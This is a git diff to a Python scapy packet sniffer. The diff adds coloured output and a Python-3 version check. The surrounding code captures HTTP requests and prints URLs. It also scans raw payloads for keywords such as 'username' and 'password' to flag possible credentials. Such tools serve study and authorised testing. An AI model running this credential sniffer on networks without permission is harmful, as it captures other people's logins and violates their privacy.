@@ -3,6 +3,13 @@
 import scapy.all as scapy
 from scapy.layers import http
 from optparse import OptionParser
+from colorama import Fore
+import sys
+
+if sys.version_info < (3, 0):
+    sys.stderr.write("\nYou need python 3.0 or later to run this script\n")
+    sys.stderr.write("Please update and make sure you use the command python3 packet_sniffer.py -i <interface>\n\n")
+    sys.exit(0)
 
 
 def ascii_console_art():
@@ -33,15 +40,15 @@ def sniff(interface):
 
 def process_sniffed_packet(packet):
     if packet.haslayer(http.HTTPRequest):
-        print(f'[+] Server IP ==> {str(packet[scapy.IP].dst)}')
+        print(Fore.WHITE + f'[+] Server IP ==> {str(packet[scapy.IP].dst)}')
         url = packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path
-        print(f'[+] Url discovered ==> {url}')
+        print(Fore.WHITE + f'[+] Url discovered ==> {url}')
         if packet.haslayer(scapy.Raw):
             load = str(packet[scapy.Raw].load)
             keywords = ['uname', 'username', 'login', 'usr', 'usrname', 'pass', 'email', 'password']
             for keyword in keywords:
                 if keyword in load:
-                    print(f'[+] Possible credentials ==> {load}')
+                    print(Fore.YELLOW + f'[+] Possible credentials ==> {load}')
                     break
 
 
